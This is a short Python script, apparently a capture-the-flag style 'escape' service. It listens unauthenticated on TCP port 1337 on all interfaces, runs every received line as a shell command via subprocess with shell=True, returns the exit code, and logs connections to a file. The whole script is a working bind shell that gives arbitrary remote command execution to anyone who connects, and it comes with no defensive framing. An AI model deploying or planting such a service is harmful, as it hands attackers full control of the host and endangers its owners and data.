#!/usr/bin/env python3
import socket
import random
import threading
import time
import subprocess


def shell(command):
	p=subprocess.Popen(f"{command}",shell=True, stdout=subprocess.PIPE,stderr=subprocess.STDOUT)

	std,err=p.communicate()
	status=p.returncode

	return status

class Escape(threading.Thread):
	def __init__(self,conn,addr):
		threading.Thread.__init__(self)
		self.csocket=conn

	def run(self):

		try:
			while True:
				self.csocket.sendall(b"> ")
				command=self.csocket.recv(1024)
				status=shell(command.decode())
				self.csocket.sendall(f"{status}\n".encode('utf-8'))
		except Exception as e:
			with open("log.txt",'a+') as f:
				f.write(f"{time.asctime()} close from {addr} due to {e}\n")
			f.close()
			self.csocket.close()

		#self.csocket.close()


host=''
port = 1337
server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
server.bind((host,port))

while True:
	server.listen(1)
	conn,addr=server.accept()
	with open("log.txt",'a+') as f:
		f.write(f"{time.asctime()} connect from {addr}\n")
	f.close()

	new_server=Escape(conn, addr)
	new_server.start()